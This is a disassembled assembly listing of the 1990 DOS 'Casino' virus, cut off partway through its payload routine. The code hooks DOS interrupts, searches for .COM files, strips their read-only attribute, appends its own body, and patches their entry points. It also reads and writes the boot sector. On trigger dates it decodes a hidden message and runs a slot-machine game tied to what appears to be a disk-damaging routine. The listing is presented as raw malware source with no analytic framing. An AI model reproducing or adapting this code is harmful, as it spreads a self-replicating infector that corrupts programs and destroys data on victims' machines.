  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        CASINO				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   31-Aug-90					         ÛÛ
;ÛÛ      Version:						         ÛÛ
;ÛÛ      Passes:    9	       Analysis Options on: H		         ÛÛ
;ÛÛ      Copyright S & S International, 1990			         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e		equ	60Ch			; (0000:060C=0)
data_2e		equ	60Dh			; (0000:060D=0)
data_3e		equ	60Eh			; (0000:060E=0)
data_4e		equ	60Fh			; (0000:060F=0)
data_5e		equ	610h			; (0000:0610=0)
data_6e		equ	611h			; (0000:0611=0)
data_7e		equ	612h			; (0000:0612=0)
data_8e		equ	2			; (6AE6:0002=0)
data_10e	equ	3Bh			; (6AE6:003B=0)
data_11e	equ	3Dh			; (6AE6:003D=0)
data_12e	equ	3Fh			; (6AE6:003F=0)
data_13e	equ	40h			; (6AE6:0040=0)
data_14e	equ	41h			; (6AE6:0041=0)
data_15e	equ	43h			; (6AE6:0043=6AE6h)
data_16e	equ	45h			; (6AE6:0045=0)
data_17e	equ	47h			; (6AE6:0047=6AE6h)
data_18e	equ	4Dh			; (6AE6:004D=0)
data_19e	equ	68h			; (6AE6:0068=0)
data_20e	equ	7Eh			; (6AE6:007E=0)
data_21e	equ	80h			; (6AE6:0080=0)
data_33e	equ	716Eh			; (6AE6:716E=0)
  
seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a
  
  
		org	100h
  
casino		proc	far
  
start:
		nop
data_23		db	0E9h
data_24		db	48h
data_25		db	7, 'ello - Copyright S & S Intern'
		db	'ational, 1990', 0Ah, 0Dh, '$'
		db	1Ah
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AA'
		db	0E6h
		db	'jAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
		db	'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
  
casino		endp
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;			External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
int_24h_entry	proc	far
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		inc	cx
		mov	ah,9
		mov	dx,offset data_25	; (6AE6:0103=7)
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		int	20h			; Program Terminate
		db	0, 0, 0, 0, 0, 0Fh
		db	0, 0, 0E9h, 0D3h, 1, 0E9h
		db	0, 0, 0, 90h, 0E9h, 78h
		db	2Ah, 2Ah, 2Eh, 43h, 4Fh, 4Dh
		db	0
		db	'C:\COMMAND.COM'
		db	0, 43h, 4Fh, 4Dh, 4Dh, 41h
		db	4Eh, 44h, 0FFh
		db	2Eh, 43h, 4Fh, 4Dh
		db	15 dup (0)
		db	3Fh, 0, 0F0h, 3, 2, 0
		db	0B3h, 4Bh, 0FCh, 91h, 56h, 5
		db	79h, 10h, 0, 0, 0, 0
		db	0, 3
		db	8 dup (3Fh)
		db	43h, 4Fh, 4Dh, 3Fh, 8, 0
		db	1Eh, 2, 2Eh, 8Bh, 26h, 68h
		db	20h, 0A9h, 8Eh, 1Fh, 15h, 0E8h
		db	3, 0, 0
		db	'H1000.COM'
		db	9 dup (0)
		db	1Fh, 15h, 0A9h, 8Eh, 90h, 90h
		db	3Dh, 59h, 4Bh, 75h, 4, 0B8h
		db	66h, 6, 0CFh, 80h, 0FCh, 11h
		db	74h, 8, 80h, 0FCh, 12h, 74h
		db	3, 0EBh, 51h, 90h
loc_2:
		cmp	al,66h			; 'f'
		je	loc_4			; Jump if equal
		mov	al,66h			; 'f'
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		push	ax
		push	bx
		push	cx
		push	dx
		push	es
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	al,es:[bx+10h]
		cmp	al,43h			; 'C'
		jne	loc_3			; Jump if not equal
		mov	al,es:[bx+11h]
		cmp	al,4Fh			; 'O'
		jne	loc_3			; Jump if not equal
		mov	al,es:[bx+12h]
		cmp	al,4Dh			; 'M'
		jne	loc_3			; Jump if not equal
		mov	ax,es:[bx+24h]
		cmp	ax,91Ah
		jb	loc_3			; Jump if below
		sub	ax,91Ah
		mov	cx,ax
		push	cx
		mov	cx,10h
		mov	dx,0
		div	cx			; ax,dx rem=dx:ax/reg
		pop	cx
		cmp	dx,0
		jne	loc_3			; Jump if not equal
		mov	es:[bx+24h],cx
loc_3:
		pop	es
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		iret				; Interrupt return
int_24h_entry	endp
  
loc_4:
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	bp
		push	ds
		push	es
		mov	bx,cs
		mov	ds,bx
		mov	al,0
		mov	ds:data_18e,al		; (6AE6:004D=0)
		mov	al,ds:data_13e		; (6AE6:0040=0)
		cmp	al,0FFh
		jne	loc_5			; Jump if not equal
		jmp	loc_15			; (06B2)
loc_5:
		mov	al,0FFh
		mov	ds:data_13e,al		; (6AE6:0040=0)
		cmp	ah,4Bh			; 'K'
		je	loc_6			; Jump if equal
		cmp	ah,36h			; '6'
		je	loc_7			; Jump if equal
		jmp	loc_15			; (06B2)
loc_6:
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	ds:data_12e,al		; (6AE6:003F=0)
		jmp	short loc_8		; (0624)
		db	90h
loc_7:
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	ds:data_12e,al		; (6AE6:003F=0)
		cmp	dl,0
		je	loc_8			; Jump if equal
		dec	dl
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
loc_8:
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		cmp	al,1
		ja	loc_9			; Jump if above
		mov	ch,0
		push	ds
		pop	es
		mov	bx,917h
		mov	al,1
		call	sub_3			; (07DB)
		mov	al,1
		call	sub_4			; (07EC)
		cmp	ah,0
		je	loc_9			; Jump if equal
		jmp	short loc_14		; (069C)
		db	90h
loc_9:
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	ds:data_14e,bx		; (6AE6:0041=0)
		mov	ds:data_15e,es		; (6AE6:0043=6AE6h)
		mov	dx,4Eh
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	dx,0Bh
		mov	cx,3Fh
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_14			; Jump if carry Set
		mov	dx,6Ch
		call	sub_1			; (06EE)
		cmp	dl,1
		jne	loc_10			; Jump if not equal
		call	sub_2			; (073C)
		jmp	short loc_14		; (069C)
		db	90h
loc_10:
		cmp	dl,3
		je	loc_11			; Jump if equal
		jmp	short loc_14		; (069C)
		db	90h
loc_11:
		mov	ah,4Fh			; 'O'
		int	21h			; DOS Services  ah=function 4Fh
						;  find next filename match
		jnc	loc_12			; Jump if carry=0
		jmp	short loc_14		; (069C)
		db	90h
loc_12:
		mov	dx,6Ch
		call	sub_1			; (06EE)
		cmp	dl,1
		jne	loc_13			; Jump if not equal
		call	sub_2			; (073C)
		jmp	short loc_14		; (069C)
		db	90h
loc_13:
		cmp	dl,3
		je	loc_11			; Jump if equal
loc_14:
		mov	dl,ds:data_12e		; (6AE6:003F=0)
		mov	ah,0Eh
		int	21h			; DOS Services  ah=function 0Eh
						;  set default drive dl  (0=a:)
		mov	dx,ds:data_14e		; (6AE6:0041=0)
		mov	bx,ds:data_15e		; (6AE6:0043=6AE6h)
		mov	ds,bx
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
loc_15:
		mov	ah,0
		mov	ds:data_13e,ah		; (6AE6:0040=0)
		pop	es
		pop	ds
		pop	bp
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
;*		jmp	far ptr loc_1		;*(0273:1460)
		db	0EAh, 60h, 14h, 73h, 2
		db	8Ch, 0CAh, 83h, 0C2h, 10h, 8Eh
		db	0DAh, 0BAh, 20h, 0, 0B4h, 41h
		db	0CDh, 21h, 0B8h, 21h, 35h, 0CDh
		db	21h, 8Ch, 6, 0D4h, 1, 89h
		db	1Eh, 0D2h, 1, 0BAh, 82h, 0
		db	0B8h, 21h, 25h, 0CDh, 21h, 0BAh
		db	1Bh, 0Ch, 0CDh
		db	27h
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
		mov	ax,ds:data_19e		; (6AE6:0068=0)
		cmp	ax,0F5B9h
		ja	loc_20			; Jump if above
		mov	ax,4300h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		test	cl,4
		jnz	loc_20			; Jump if not zero
		test	cl,1
		jz	loc_16			; Jump if zero
		and	cl,0FEh
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
loc_16:
		mov	ax,3D02h
		int	21h			; DOS Services  ah=function 3Dh
						;  open file, al=mode,name@ds:dx
		mov	bx,ax
		mov	dx,3
		mov	cx,1
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		jnc	loc_17			; Jump if carry=0
		jmp	short loc_19		; (0732)
		db	90h
loc_17:
		cmp	ax,0
		jne	loc_18			; Jump if not equal
		jmp	short loc_19		; (0732)
		db	90h
loc_18:
		mov	al,byte ptr ds:data_8e+1	; (6AE6:0003=0)
		cmp	al,90h
		jne	loc_21			; Jump if not equal
loc_19:
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
loc_20:
		mov	dl,3
		retn
loc_21:
		mov	dl,1
		retn
sub_1		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2		proc	near
		mov	ax,5700h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ds:data_20e,dx		; (6AE6:007E=0)
		mov	ds:data_21e,cx		; (6AE6:0080=0)
		push	bx
		call	sub_5			; (07FD)
		mov	bx,68h
		mov	ax,[bx]
		mov	dx,0
		mov	bx,10h
		div	bx			; ax,dx rem=dx:ax/reg
		inc	ax
		mov	ds:data_10e,ax		; (6AE6:003B=0)
		mul	bx			; dx:ax = reg * ax
		mov	ds:data_11e,ax		; (6AE6:003D=0)
		pop	bx
		mov	cx,ds:data_10e		; (6AE6:003B=0)
		mov	si,35Fh
		mov	[si],cx
		mov	cx,0
		mov	dx,0
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,605h
		mov	cx,4
		mov	ah,3Fh			; '?'
		int	21h			; DOS Services  ah=function 3Fh
						;  read file, cx=bytes, to ds:dx
		mov	cx,0
		mov	dx,ds:data_11e		; (6AE6:003D=0)
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	dx,0
		mov	cx,91Ah
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		cmp	ax,cx
		jb	loc_22			; Jump if below
		mov	al,ds:data_18e		; (6AE6:004D=0)
		cmp	al,1
		je	loc_22			; Jump if equal
		mov	cx,0
		mov	dx,0
		mov	ax,4200h
		int	21h			; DOS Services  ah=function 42h
						;  move file ptr, cx,dx=offset
		mov	si,9
		mov	ax,ds:data_11e		; (6AE6:003D=0)
		add	ax,35Ch
		sub	ax,4
		mov	[si],ax
		mov	dx,7
		mov	cx,4
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
loc_22:
		mov	dx,ds:data_20e		; (6AE6:007E=0)
		mov	cx,ds:data_21e		; (6AE6:0080=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		call	sub_6			; (0813)
		retn
sub_2		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_3		proc	near
		push	ax
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	dl,al
		pop	ax
		mov	dh,0
		mov	cl,1
		mov	ah,2
		int	13h			; Disk  dl=drive #: ah=func b2h
						;  read sectors to memory es:bx
		retn
sub_3		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_4		proc	near
		push	ax
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	dl,al
		pop	ax
		mov	dh,0
		mov	cl,1
		mov	ah,3
		int	13h			; Disk  dl=drive #: ah=func b3h
						;  write sectors from mem es:bx
		retn
sub_4		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5		proc	near
		mov	ax,3524h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_16e,bx		; (6AE6:0045=0)
		mov	ds:data_17e,es		; (6AE6:0047=6AE6h)
		mov	dx,335h
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		retn
sub_5		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6		proc	near
		mov	dx,ds:data_16e		; (6AE6:0045=0)
		mov	cx,ds:data_17e		; (6AE6:0047=6AE6h)
		push	ds
		push	cx
		pop	ds
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		pop	ds
		retn
sub_6		endp
  
		db	50h, 53h, 51h, 52h, 1Eh, 6
		db	0B4h, 0, 0CDh, 13h, 0B4h, 1
		db	88h, 26h, 4Dh, 0, 0BFh, 0FFh
		db	0FFh, 8Eh, 6, 49h, 0, 8Bh
		db	1Eh, 4Bh, 0, 0B0h, 0, 26h
		db	88h, 7, 7, 1Fh, 5Ah, 59h
		db	5Bh, 58h, 0CFh, 8Ch, 0CAh, 0B9h
		db	3Fh, 0, 3, 0D1h, 83h, 0C2h
		db	10h, 8Eh, 0DAh, 0A1h, 3Dh, 0
		db	5, 3, 6, 0BBh, 0FEh, 0FFh
		db	2Bh, 0D8h, 89h, 1Eh, 3, 6
		db	0BBh, 5, 6, 8Ah, 7, 2Eh
		db	0A2h, 0, 1, 43h, 8Ah, 7
		db	2Eh, 0A2h, 1, 1, 43h, 8Ah
		db	7, 2Eh, 0A2h, 2, 1, 43h
		db	8Ah, 7, 2Eh, 0A2h, 3, 1
		db	0B4h, 2Ah, 0CDh, 21h, 80h, 0FAh
		db	0Fh, 74h, 3, 0E9h, 0A2h, 1
loc_23:
		cmp	dh,1
		je	loc_24			; Jump if equal
		cmp	dh,4
		je	loc_24			; Jump if equal
		cmp	dh,8
		je	loc_24			; Jump if equal
		jmp	loc_36			; (0A33)
loc_24:
		call	sub_8			; (09EB)
		push	ds
		pop	es
		mov	si,613h
		mov	di,613h
		mov	cx,305h
		cld				; Clear direction
  
locloop_25:
		lodsb				; String [si] to al
		sub	al,64h			; 'd'
		stosb				; Store al to es:[di]
		loop	locloop_25		; Loop if cx > 0
  
		mov	dx,613h
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
loc_26:
		mov	ah,7
		int	21h			; DOS Services  ah=function 07h
						;  get keybd char al, no echo
		mov	byte ptr ds:data_2e,64h	; (0000:060D=0) 'd'
		nop
		mov	byte ptr ds:data_3e,78h	; (0000:060E=0) 'x'
		nop
		mov	byte ptr ds:data_4e,0B4h	; (0000:060F=0)
		nop
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dh=sec
		mov	bl,dh
		mov	bh,0
		mov	ch,0
		mov	dh,0
		add	cl,dl
		mov	ax,cx
		mov	cl,3
		div	cl			; al, ah rem = ax/reg
		mov	ds:data_5e,ah		; (0000:0610=0)
		mov	ax,dx
		mov	dl,3
		div	dl			; al, ah rem = ax/reg
		mov	ds:data_6e,ah		; (0000:0611=0)
		mov	ax,bx
		div	dl			; al, ah rem = ax/reg
		mov	ds:data_7e,ah		; (0000:0612=0)
		dec	byte ptr ds:data_1e	; (0000:060C=0)
		mov	al,ds:data_1e		; (0000:060C=0)
		add	al,30h			; '0'
		mov	dh,0Dh
		mov	dl,26h			; '&'
		mov	bx,0
		mov	ah,2
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
loc_27:
		mov	dx,1FFFh
loc_28:
		nop
		nop
		nop
		dec	dx
		jnz	loc_28			; Jump if not zero
		mov	al,ds:data_2e		; (0000:060D=0)
		cmp	al,ds:data_5e		; (0000:0610=0)
		je	loc_29			; Jump if equal
		mov	dl,19h
		mov	al,ds:data_2e		; (0000:060D=0)
		call	sub_7			; (09C9)
		mov	al,ds:data_2e		; (0000:060D=0)
		dec	al
		mov	ds:data_2e,al		; (0000:060D=0)
loc_29:
		mov	al,ds:data_3e		; (0000:060E=0)
		cmp	al,ds:data_6e		; (0000:0611=0)
		je	loc_30			; Jump if equal
		mov	dl,21h			; '!'
		mov	al,ds:data_3e		; (0000:060E=0)
		call	sub_7			; (09C9)
		dec	byte ptr ds:data_3e	; (0000:060E=0)
loc_30:
		mov	al,ds:data_4e		; (0000:060F=0)
		cmp	al,ds:data_7e		; (0000:0612=0)
		je	loc_31			; Jump if equal
		mov	dl,29h			; ')'
		mov	al,ds:data_4e		; (0000:060F=0)
		call	sub_7			; (09C9)
		dec	byte ptr ds:data_4e	; (0000:060F=0)
loc_31:
		mov	al,ds:data_4e		; (0000:060F=0)
		cmp	al,ds:data_7e		; (0000:0612=0)
		jne	loc_27			; Jump if not equal
		mov	ah,ds:data_3e		; (0000:060E=0)
		cmp	ah,ds:data_6e		; (0000:0611=0)
		jne	loc_27			; Jump if not equal
		mov	bl,ds:data_2e		; (0000:060D=0)
		cmp	bl,ds:data_5e		; (0000:0610=0)
		jne	loc_27			; Jump if not equal
		cmp	al,0
		jne	loc_32			; Jump if not equal
		cmp	ah,0
		jne	loc_32			; Jump if not equal
		cmp	bl,0
		jne	loc_32			; Jump if not equal
		mov	dx,80Ah
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		call	sub_9			; (0A18)
		jmp	short loc_35		; (09C7)
		db	90h
loc_32:
		cmp	al,1
		jne	loc_33			; Jump if not equal
		cmp	ah,1
		jne	loc_33			; Jump if not equal
		cmp	bl,1
		jne	loc_33			; Jump if not equal
		mov	dx,88Dh
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		jmp	short loc_34		; (09BD)
		db	90h
loc_33:
		mov	al,ds:data_1e		; (0000:060C=0)
		cmp	al,0
		je	loc_34			; Jump if equal
		jmp	loc_26			; (08BF)
loc_34:
		mov	dx,8D6h
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
